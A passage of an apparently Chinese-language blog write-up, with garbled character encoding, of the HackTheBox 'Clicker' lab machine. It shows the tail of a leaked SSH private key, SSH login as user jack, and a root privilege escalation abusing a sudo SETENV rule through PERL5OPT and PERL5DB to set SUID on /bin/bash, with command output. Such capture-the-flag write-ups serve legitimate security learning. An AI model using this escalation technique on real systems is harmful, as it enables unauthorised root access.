class="line">EhA8zfl5uimjsT31lks3jwk/I8CupZGrVvXmyEzBYZBegl3W4AAADBAO19sPL8ZYYo1n2j</span><br><span class="line">rghoSkgwA8kZJRy6BIyRFRUODsYBlK0ItFnriPgWSE2b3iHo7cuujCDju0yIIfF2QG87Hh</span><br><span class="line">zXj1wghocEMzZ3ELIlkIDY8BtrewjC3CFyeIY3XKCY5AgzE2ygRGvEL+YFLezLqhJseV8j</span><br><span class="line">3kOhQ3D6boridyK3T66YGzJsdpEvWTpbvve3FM5pIWmA5LUXyihP2F7fs2E5aDBUuLJeyi</span><br><span class="line">F0YCoftLetCA/kiVtqlT0trgO8Yh+78QAAAMEAwYV0GjQs3AYNLMGccWlVFoLLPKGItynr</span><br><span class="line">Xxa/j3qOBZ+HiMsXtZdpdrV26N43CmiHRue4SWG1m/Vh3zezxNymsQrp6sv96vsFjM7gAI</span><br><span class="line">JJK+Ds3zu2NNNmQ82gPwc/wNM3TatS/Oe4loqHg3nDn5CEbPtgc8wkxheKARAz0SbztcJC</span><br><span class="line">LsOxRu230Ti7tRBOtV153KHlE4Bu7G/d028dbQhtfMXJLu96W1l3Fr98pDxDSFnig2HMIi</span><br><span class="line">lL4gSjpD/FjWk9AAAADGphY2tAY2xpY2tlcgECAwQFBg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY---</span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>

<p><code>id_rsa</code> æ˜¯ SSH å¯†é’¥æ–‡ä»¶çš„é»˜è®¤åç§°ä¹‹ä¸€ã€‚åœ¨ SSH å¯†é’¥è®¤è¯ä¸­ï¼Œid_rsa æ˜¯ç§é’¥æ–‡ä»¶çš„é»˜è®¤åç§°ï¼Œè€Œ id_rsa.pub æ˜¯ç›¸åº”çš„å…¬é’¥æ–‡ä»¶çš„é»˜è®¤åç§°ã€‚è¿™äº›æ–‡ä»¶é€šå¸¸ç”¨äº SSH å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨è¿›è¡Œå®‰å…¨è¿æ¥å’Œèº«ä»½éªŒè¯ã€‚ç§é’¥æ–‡ä»¶ï¼ˆid_rsaï¼‰åº”è¯¥è¢«å¦¥å–„ä¿ç®¡ï¼Œè€Œå…¬é’¥æ–‡ä»¶ï¼ˆid_rsa.pubï¼‰é€šå¸¸è¢«æ”¾ç½®åœ¨éœ€è¦è¿›è¡Œèº«ä»½éªŒè¯çš„æœåŠ¡å™¨ä¸Šçš„ <code>.ssh/authorized_keys</code> æ–‡ä»¶ä¸­ã€‚ SSH å¯†é’¥å¯¹é€šå¸¸ç”¨äºæ›¿ä»£ä¼ ç»Ÿçš„åŸºäºå¯†ç çš„èº«ä»½éªŒè¯ï¼Œæä¾›äº†æ›´é«˜çš„å®‰å…¨æ€§ã€‚</p>
<p>è¿™é‡Œè¯»å–çš„æ–‡ä»¶æ ¼å¼æœ‰ç‚¹é—®é¢˜ç¬¬ä¸€è¡Œå’Œæœ€åä¸€è¡Œå°‘äº†ä¸¤ä¸ª<code>-</code>ç¬¦å·ï¼ŒåŠ ä¸Šå»ï¼Œè¿˜éœ€è¦å°†æƒé™æ”¹æˆåªè¯»ï¼Œå¦åˆ™ä¸è®©è¿æ¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ ssh -i id_rsa -l jack 10.10.11.232</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">Permissions 0644 <span class="keyword">for</span> <span class="string">&#x27;id_rsa&#x27;</span> are too open.</span><br><span class="line">It is required that your private key files are NOT accessible by others.</span><br><span class="line">This private key will be ignored.</span><br><span class="line">Load key <span class="string">&quot;id_rsa&quot;</span>: bad permissions</span><br><span class="line">jack@10.10.11.232<span class="string">&#x27;s password: </span></span><br></pre></td></tr></table></figure>

<p>æ”¹æˆåªè¯»å°±å¥½äº†ï¼Œå†ç”¨sshè¿æ¥å³å¯ï¼›</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 400 id_rsa</span><br></pre></td></tr></table></figure>

<h3 id="user-jack"><a href="#user-jack" class="headerlink" title="user_jack"></a>user_jack</h3><h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.1$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jack on clicker:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User jack may run the following commands on clicker:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) SETENV: NOPASSWD: /opt/monitor.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.1$ <span class="built_in">cat</span> /opt/monitor.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -ne 0 ]<span class="comment">#idä¸ä¸º0</span></span><br><span class="line">  <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;Error, please run as root&quot;</span></span><br><span class="line">  <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line"><span class="built_in">unset</span> PERL5LIB;</span><br><span class="line"><span class="built_in">unset</span> PERLLIB;</span><br><span class="line"></span><br><span class="line">data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);</span><br><span class="line">/usr/bin/xml_pp &lt;&lt;&lt; <span class="variable">$data</span>;</span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$NOSAVE</span> == <span class="string">&quot;true&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">exit</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    timestamp=$(/usr/bin/date +%s)</span><br><span class="line">    /usr/bin/echo <span class="variable">$data</span> &gt; /root/diagnostic_files/diagnostic_<span class="variable">$&#123;timestamp&#125;</span>.xml</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ï¼›</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unset</span> PERL5LIB;</span><br><span class="line"><span class="built_in">unset</span> PERLLIB;</span><br><span class="line"></span><br><span class="line">è¿™ä¸¤è¡Œå‘½ä»¤æ˜¯ç”¨äºåœ¨Unix/Linuxæ“ä½œç³»ç»Ÿä¸‹å–æ¶ˆè®¾ç½®ç¯å¢ƒå˜é‡çš„å‘½ä»¤ã€‚è®©æˆ‘ä¸ºæ‚¨è§£é‡Šæ¯ä¸ªå‘½ä»¤çš„å«ä¹‰ï¼š</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> PERL5LIB;ï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºå–æ¶ˆè®¾ç½®åä¸ºPERL5LIBçš„ç¯å¢ƒå˜é‡ã€‚PERL5LIBæ˜¯ä¸€ä¸ªç”¨äºæŒ‡å®šPerlç¼–ç¨‹è¯­è¨€åº“è·¯å¾„çš„ç¯å¢ƒå˜é‡ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå®ƒç”¨äºå‘Šè¯‰Perlè§£é‡Šå™¨åœ¨å“ªé‡ŒæŸ¥æ‰¾Perlæ¨¡å—å’Œåº“æ–‡ä»¶ã€‚é€šè¿‡è¿è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œæ‚¨å°†ä»ç¯å¢ƒä¸­ç§»é™¤PERL5LIBå˜é‡çš„å®šä¹‰ï¼Œä½¿å¾—Perlä¸å†ä½¿ç”¨è¯¥å˜é‡æ¥å®šä½æ¨¡å—å’Œåº“æ–‡ä»¶ã€‚</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> PERLLIB;ï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºå–æ¶ˆè®¾ç½®åä¸ºPERLLIBçš„ç¯å¢ƒå˜é‡ã€‚ç±»ä¼¼äºPERL5LIBï¼ŒPERLLIBä¹Ÿæ˜¯ç”¨äºæŒ‡å®šPerlåº“è·¯å¾„çš„ç¯å¢ƒå˜é‡ã€‚è¿è¡Œè¿™ä¸ªå‘½ä»¤å°†ä»ç¯å¢ƒä¸­ç§»é™¤PERLLIBå˜é‡çš„å®šä¹‰ï¼Œåœæ­¢ä½¿ç”¨å®ƒæ¥å®šä½Perlæ¨¡å—å’Œåº“æ–‡ä»¶ã€‚</span><br><span class="line"></span><br><span class="line">å–æ¶ˆè®¾ç½®è¿™äº›ç¯å¢ƒå˜é‡é€šå¸¸æ˜¯åœ¨éœ€è¦æ¢å¤åˆ°é»˜è®¤Perlåº“è·¯å¾„æˆ–åœ¨ç‰¹å®šæƒ…å†µä¸‹ä¸å¸Œæœ›ä½¿ç”¨è¿™äº›è‡ªå®šä¹‰è·¯å¾„æ—¶ä½¿ç”¨çš„ã€‚å®ƒä»¬åœ¨ç¡®ä¿Perlåœ¨ç‰¹å®šä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨é»˜è®¤è®¾ç½®æ—¶éå¸¸æœ‰ç”¨ã€‚</span><br></pre></td></tr></table></figure>

<p>åº”è¯¥æ—¶ä¸ºäº†é¢„é˜²é€šè¿‡æ›´æ”¹è¿™ä¸¤ä¸ªç¯å¢ƒå˜é‡æ¥è¿›è¡Œæ”»å‡»ï¼Œè¿™è¯´æ˜äº†é‡Œé¢æœ‰perlå†™çš„ç¨‹åºã€‚åº”è¯¥æ˜¯&#x2F;usr&#x2F;bin&#x2F;xml_ppï¼Œä½†æ˜¯é™¤äº†ä¸¤ä¸ªç¯å¢ƒå˜é‡æ˜¯å±é™©çš„ï¼Œè¿˜æœ‰ä¸¤ä¸ªã€‚</p>
<ol>
<li>**<code>PERL5OPT=-d</code>**ï¼šè¿™éƒ¨åˆ†å°† <strong><code>PERL5OPT</code></strong> ç¯å¢ƒå˜é‡è®¾ç½®ä¸º <strong><code>d</code><strong>ã€‚åœ¨Perlä¸­ï¼Œ</strong><code>d</code></strong> é€‰é¡¹ç”¨äºå¯åŠ¨è°ƒè¯•å™¨ï¼Œå®ƒå…è®¸æ‚¨åœ¨ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­è¿›è¡Œè°ƒè¯•ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™æ˜¯ä¸€ä¸ªåˆæ³•çš„ç”¨æ³•ï¼Œç”¨äºåœ¨å¼€å‘å’Œè°ƒè¯•Perlè„šæœ¬æ—¶å¯ç”¨è°ƒè¯•åŠŸèƒ½ã€‚</li>
<li>**<code>PERL5DB=&#39;system(&quot;chmod u+s /bin/bash&quot;);&#39;</code>**ï¼šè¿™éƒ¨åˆ†å°† <strong><code>PERL5DB</code></strong> ç¯å¢ƒå˜é‡è®¾ç½®ä¸ºä¸€ä¸ªPerlè¡¨è¾¾å¼ã€‚è¿™ä¸ªPerlè¡¨è¾¾å¼çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªæ¶æ„çš„å‘½ä»¤ï¼Œå®ƒè¯•å›¾åœ¨Perlè°ƒè¯•å™¨ç¯å¢ƒä¸­è¿è¡Œ **<code>system(&quot;chmod u+s /bin/bash&quot;);</code>**ã€‚è¿™ä¸ªå‘½ä»¤çš„ç›®çš„æ˜¯åœ¨ç³»ç»Ÿä¸­ä¸º <strong><code>/bin/bash</code></strong> è¿™ä¸ªShellç¨‹åºè®¾ç½®äº†ç”¨æˆ·å¯æ‰§è¡Œçš„SUIDï¼ˆSet User IDï¼‰æƒé™ï¼Œè¿™å°†ä½¿å¾—ä»»ä½•ç”¨æˆ·éƒ½èƒ½ä»¥è¶…çº§ç”¨æˆ·çš„æƒé™è¿è¡Œ **<code>/bin/bash</code>**ï¼Œè¿™æ˜¯éå¸¸å±é™©å’Œä¸å®‰å…¨çš„æ“ä½œã€‚</li>
</ol>
<p>å¤§æ¦‚æ„æ€æ˜¯åœ¨æ‰§è¡Œperlç¨‹åºæ—¶å¼€å¯è°ƒè¯•ï¼Œç„¶åå†è°ƒè¯•æ—¶è¿è¡Œ**<code>system(&quot;chmod u+s /bin/bash&quot;);</code>** </p>
<p>æ‰§è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo PERL5OPT=-d PERL5DB=<span class="string">&#x27;system(&quot;chmod u+s /bin/bash&quot;);&#x27;</span> /opt/monitor.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.1$ sudo PERL5OPT=-d PERL5DB=<span class="string">&#x27;system(&quot;chmod u+s /bin/bash&quot;);&#x27;</span> /opt/monitor.sh</span><br><span class="line">No DB::DB routine defined at /usr/bin/xml_pp line 9.</span><br><span class="line">No DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870.</span><br><span class="line">END failed--call queue aborted.</span><br><span class="line">-bash-5.1$ bash -p</span><br><span class="line">bash-5.1<span class="comment"># id</span></span><br><span class="line">uid=1000(jack) gid=1000(jack) euid=0(root) <span class="built_in">groups</span>=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)</span><br><span class="line">bash-5.1<span class="comment">#</span></span><br></pre></td></tr></table></figure>



<h4 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h4><p>å‡çº§shellå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c++</span><br></pre></td></tr></table></figure>

</p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-14</span><i class="fa fa-tag"></i><a class="tag" href="/tags/HTB/" title="HTB">HTB </a><span class="leancloud_visitors"></span><span>About 3792 words, 12 min 38 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20Clicker(HTB)%0Ahttps://zIxyd.github.io/2023/12/14/Clicker(HTB)/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2023/12/15/Drive(HTB)/" title="Drive(HTB)">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2023/12/13/Zipping(HTB)/" title="Zipping(HTB)">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>